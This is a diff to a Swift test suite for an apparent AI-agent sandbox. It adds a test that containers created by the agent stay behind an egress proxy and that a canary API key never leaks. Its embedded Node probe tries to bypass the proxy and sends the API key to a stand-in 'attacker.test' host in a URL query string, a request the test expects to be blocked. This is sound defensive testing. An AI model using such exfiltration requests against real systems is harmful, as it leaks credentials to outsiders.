@@ -12,7 +12,7 @@ import Testing
 /// echo endpoints, an attacker over TLS and over plain TCP); the workspace reaches them only through the proxy. Every
 /// attempt's output, the workspace's filesystem export and both containers' configuration are scanned for the canary
 /// in every encoding the scanner knows; so is everything the attacker servers received. Writes the results table to
-/// `build/secrets-adversarial.md`. Everything created is labelled `app.bellocode.test=secrets` and removed.
+/// `build/secrets-adversarial-{project,shared}.md`. Everything created is labelled `app.bellocode.test=secrets` and removed.
 @Suite("Live egress (adversarial)", .serialized, .timeLimit(.minutes(10)),
        .enabled(if: ProcessInfo.processInfo.environment["BELLOCODE_SECRET_LIVE"] == "1", "set BELLOCODE_SECRET_LIVE=1"))
 struct LiveEgressTests {
@@ -32,14 +32,20 @@ struct LiveEgressTests {
 
     func leaked(_ data: Data) -> Bool { !SecretPatterns(value: Data(Self.canary.utf8)).forms(in: data).isEmpty }
 
-    @Test func canaryNeverReachesTheAgent() async throws {
+    /// The same suite against a project's container and against a shared workspace (code roots; its own test seed,
+    /// never the person's shared container).
+    @Test(arguments: ["project", "shared"])
+    func canaryNeverReachesTheAgent(kind: String) async throws {
         let scopeKey = "t" + UUID().uuidString.replacingOccurrences(of: "-", with: "").prefix(10).lowercased()
         let root = NSHomeDirectory() + "/Library/Caches/BelloCode/tests/egress-\(scopeKey)"
         let certs = root + "-certs"
         try FileManager.default.createDirectory(atPath: root, withIntermediateDirectories: true)
         try FileManager.default.createDirectory(atPath: certs, withIntermediateDirectories: true)
         let gateway = EgressGateway(client: client)
-        var spec = WorkspaceSpec(projectRoot: root, image: Self.image, extraLabels: Self.labels)
+        var spec = kind == "shared"
+            ? WorkspaceSpec.shared(roots: [root], image: Self.image, extraLabels: Self.labels)
+            : WorkspaceSpec(projectRoot: root, image: Self.image, extraLabels: Self.labels)
+        if kind == "shared" { spec.sharedKeySeed = "bellocode-test-shared-\(scopeKey)" }
         var cleanup: [() async -> Void] = [
             { try? FileManager.default.removeItem(atPath: root) },
             { try? FileManager.default.removeItem(atPath: certs) },
@@ -222,7 +228,7 @@ struct LiveEgressTests {
                                         observed: "\(server.requestCount) requests, \(received.count) bytes", canaryAbsent: !leaked(received), behaved: true))
                 #expect(!leaked(received), "\(name) received the canary")
             }
-            try writeTable(attempts)
+            try writeTable(attempts, kind: kind)
         } catch {
             for step in cleanup { await step() }
             throw error
@@ -273,7 +279,7 @@ struct LiveEgressTests {
         return String(decoding: data, as: UTF8.self)
     }
 
-    func writeTable(_ attempts: [Attempt]) throws {
+    func writeTable(_ attempts: [Attempt], kind: String) throws {
         var lines = ["| Area | Attempt | Expected | Observed | Canary absent | As expected |", "| --- | --- | --- | --- | --- | --- |"]
         for attempt in attempts {
             lines.append("| \(attempt.area) | \(attempt.name) | \(attempt.expectation) | \(attempt.observed.replacingOccurrences(of: "\r", with: "")) | \(attempt.canaryAbsent ? "yes" : "**NO**") | \(attempt.behaved ? "yes" : "**no**") |")
@@ -281,7 +287,7 @@ struct LiveEgressTests {
         let directory = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
             .appending(path: "build", directoryHint: .isDirectory)
         try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
-        try Data((lines.joined(separator: "\n") + "\n").utf8).write(to: directory.appending(path: "secrets-adversarial.md"))
+        try Data((lines.joined(separator: "\n") + "\n").utf8).write(to: directory.appending(path: "secrets-adversarial-\(kind).md"))
     }
 }
 
@@ -358,3 +364,121 @@ struct LiveEgressRoutingTests {
         }
     }
 }
+
+/// Containers the agent creates through BelloCode's filtered Docker endpoint, from an egress-enforced workspace: the
+/// endpoint is reached through the gateway (`bellocode-proxy:2375`), and what it creates (on the default network, or on a
+/// network the agent creates) sits on the same egress-only boundary: proxy variables, the egress CA, no direct route,
+/// no outside DNS; a placeholder still works only for its binding; the canary never shows.
+@Suite("Live egress: agent containers", .serialized, .timeLimit(.minutes(6)),
+       .enabled(if: ProcessInfo.processInfo.environment["BELLOCODE_SECRET_LIVE"] == "1", "set BELLOCODE_SECRET_LIVE=1"))
+struct LiveEgressAgentContainerTests {
+    let client = EngineClient(socketPath: NSHomeDirectory() + "/.rd/docker.sock")
+    static let workspaceImage = "bellocode-test-ws:1"  // node + docker CLI (docs/features/workspace-image.Dockerfile)
+    static let agentImage = "node:22-bookworm-slim"
+
+    /// Run inside an agent container: what it sees and what it can reach.
+    static let probe = #"""
+    const net=require('net'),tls=require('tls'),dns=require('dns'),fs=require('fs');
+    const out=[];const log=s=>out.push(s);
+    log('proxy='+process.env.HTTPS_PROXY);log('ca='+fs.existsSync('/etc/bellocode/certs/ca-bundle.pem'));
+    const step=(f)=>new Promise(r=>f(r));
+    (async()=>{
+      await step(r=>dns.lookup('example.com',e=>{log('dns='+(e?'fail':'resolved'));r()}));
+      await step(r=>{const s=net.connect(443,'1.1.1.1');s.setTimeout(3000);s.on('connect',()=>{log('direct=connected');s.destroy();r()});s.on('error',()=>{log('direct=fail');r()});s.on('timeout',()=>{log('direct=fail');s.destroy();r()})});
+      await step(r=>{const s=net.connect(3128,'bellocode-proxy',()=>{s.write('CONNECT bound.test:443 HTTP/1.1\r\n\r\n')});let b='';
+        s.on('data',d=>{b+=d;if(b.includes('\r\n\r\n')){s.removeAllListeners('data');const t=tls.connect({socket:s,servername:'bound.test'},()=>{t.write('GET /v1/echo HTTP/1.1\r\nHost: bound.test\r\nAuthorization: Bearer '+process.env.API_KEY+'\r\nConnection: close\r\n\r\n')});
+        let x='';t.on('data',d=>x+=d);t.on('end',()=>{log('bound='+x.split('\r\n')[0]);log('echo='+x.slice(-300));r()});t.on('error',e=>{log('bound=tls '+e.message);r()})}});
+        s.on('error',e=>{log('bound=fail '+e.message);r()})});
+      await step(r=>{const s=net.connect(3128,'bellocode-proxy',()=>{s.write('GET http://attacker.test/x?k='+process.env.API_KEY+' HTTP/1.1\r\nHost: attacker.test\r\n\r\n')});let b='';s.on('data',d=>b+=d);s.setTimeout(4000);
+        const done=()=>{log('attacker='+b.split('\r\n')[0]);s.destroy();r()};s.on('end',done);s.on('timeout',done);s.on('error',done)});
+      console.log(out.join('\n'));
+    })();
+    """#
+
+    @Test func agentContainersSitBehindTheSameBoundary() async throws {
+        let key = "a" + UUID().uuidString.replacingOccurrences(of: "-", with: "").prefix(10).lowercased()
+        let root = NSHomeDirectory() + "/Library/Caches/BelloCode/tests/agent-\(key)"
+        let certs = root + "-certs"
+        try FileManager.default.createDirectory(atPath: root, withIntermediateDirectories: true)
+        try FileManager.default.createDirectory(atPath: certs, withIntermediateDirectories: true)
+        let canary = "sk_live_CANARY_\(UUID().uuidString.replacingOccurrences(of: "-", with: ""))"
+        let patterns = SecretPatterns(value: Data(canary.utf8))
+        let serverCA = try CertificateAuthority(commonName: "Agent containers servers CA")
+        let bound = try await EchoServer(name: "bound.test", authority: serverCA)
+        let attacker = try await EchoServer(name: "attacker.test", authority: nil)
+        let proxyCA = try CertificateAuthority(commonName: "Agent containers egress CA")
+        let proxy = EgressProxy(authority: proxyCA, configuration: EgressProxyConfiguration(
+            extraAnchors: [serverCA.certificateDER],
+            resolverOverrides: ["bound.test": HostPort(host: "127.0.0.1", port: Int(bound.port)),
+                                "attacker.test": HostPort(host: "127.0.0.1", port: Int(attacker.port))]))
+        let proxyPort = try await proxy.start()
+        let token = UUID().uuidString
+        proxy.setScopes([EgressScope(id: key, token: token) { _ in true }])
+        let secret = ManagedSecret(account: "bcs_agent", name: "API_KEY", label: "Canary", mode: .placeholder,
+                                   bindings: [SecretBinding(host: "bound.test", pathPrefixes: ["/v1"], locations: [.header("Authorization", prefix: "Bearer ")])])
+        let placeholder = Placeholder.make()
+        proxy.update(EgressSnapshot(grants: [placeholder: PlaceholderGrant(placeholder: placeholder, account: secret.account, sessionID: "s", projectDirectory: root)],
+                                    secrets: [secret.account: secret], values: [secret.account: SecretValue(canary)]))
+        for name in [CorporateNetwork.bundleName, CorporateNetwork.enterpriseName] {
+            try Data(proxyCA.pem.utf8).write(to: URL(fileURLWithPath: certs + "/" + name))
+        }
+        let attachment = EgressAttachment(network: EgressGateway.networkName(key), caFingerprint: proxyCA.fingerprint)
+        let filter = try DockerFilterProxy(daemonSocket: NSHomeDirectory() + "/.rd/docker.sock")
+        let dockerToken = filter.register(DockerScope(key: key, roots: [root], egress: DockerEgress(
+            network: attachment.network, environment: attachment.environment, certificateDirectory: certs)))
+        let filterTask = Task { await filter.run() }
+        proxy.setDockerEndpointPort(UInt16(filter.port))
+        let gateway = EgressGateway(client: client)
+        var spec = WorkspaceSpec(projectRoot: root, image: Self.workspaceImage, extraLabels: LiveEgressTests.labels)
+        spec.egress = attachment
+        spec.corporateNetwork = CorporateNetwork(certificateDirectory: certs, certificateFingerprint: proxyCA.fingerprint)
+        let manager = WorkspaceManager(client: client)
+        var first = "", second = "", refused = ""
+        do {
+            try await gateway.ensure(EgressGatewaySpec(scopeKey: key, image: Self.workspaceImage, proxyPort: Int(proxyPort), token: token,
+                                                       extraLabels: LiveEgressTests.labels))
+            let container = try await manager.ensureRunning(spec, pull: false)
+            func run(_ script: String) async throws -> String {
+                let result = try await ExecSession.run(
+                    client: client, container: container, argv: ["/bin/sh", "-c", script], workingDir: root,
+                    environment: ["API_KEY": placeholder, "DOCKER_HOST": "tcp://\(EgressAttachment.proxyAlias):\(EgressAttachment.dockerPort)/\(dockerToken)"],
+                    user: spec.user, timeout: .seconds(120))
+                return String(decoding: result.stdout + result.stderr, as: UTF8.self)
+            }
+            let probe = Self.probe.replacingOccurrences(of: "'", with: "'\\''")
+            first = try await run("docker run --rm -e API_KEY=\"$API_KEY\" \(Self.agentImage) node -e '\(probe)' 2>&1")
+            second = try await run("docker network create agentnet-\(key) >/dev/null && docker run --rm --network agentnet-\(key) -e API_KEY=\"$API_KEY\" \(Self.agentImage) node -e '\(probe)' 2>&1; docker network rm agentnet-\(key) >/dev/null")
+            refused = try await run("docker run --rm --network host \(Self.agentImage) true 2>&1; docker run --rm --network \(attachment.network) \(Self.agentImage) true 2>&1")
+        } catch {
+            Issue.record("\(error)")
+        }
+        for leftover in (try? await client.listContainers(labels: ["app.bellocode.agent-scope=\(key)"])) ?? [] {
+            try? await client.removeContainer(leftover.id, force: true)
+        }
+        try? await client.removeNetwork("agentnet-\(key)")
+        if let storage = try? await manager.storage(projectKey: spec.projectKey) { try? await manager.purge(storage) }
+        await gateway.remove(scopeKey: key, network: true)
+        filter.stop()
+        filterTask.cancel()
+        proxy.stop()
+        bound.stop()
+        attacker.stop()
+        try? FileManager.default.removeItem(atPath: root)
+        try? FileManager.default.removeItem(atPath: certs)
+
+        for (name, output) in [("default network", first), ("agent network", second)] {
+            #expect(output.contains("proxy=http://bellocode-proxy:3128"), "\(name): \(output.prefix(600))")
+            #expect(output.contains("ca=true"), "\(name)")
+            #expect(output.contains("dns=fail") && output.contains("direct=fail"), "\(name): \(output.prefix(600))")
+            #expect(output.contains("bound=HTTP/1.1 200"), "\(name): \(output.prefix(600))")
+            #expect(output.contains("attacker=HTTP/1.1 403"), "\(name)")
+            #expect(patterns.forms(in: Data(output.utf8)).isEmpty, "\(name): the canary reached the agent container's output")
+        }
+        #expect(refused.contains("host network") && refused.components(separatedBy: "BelloCode refused").count >= 3, "\(refused.prefix(400))")
+        #expect(patterns.forms(in: attacker.receivedBytes).isEmpty && attacker.requestCount == 0)
+        #expect(ByteSearch.count(bound.receivedBytes, Data(canary.utf8)) == 2, "both agent containers' calls were substituted")
+        let leftovers = (try? await client.listContainers(labels: ["app.bellocode.agent-scope=\(key)"])) ?? []
+        #expect(leftovers.isEmpty)
+    }
+}
+
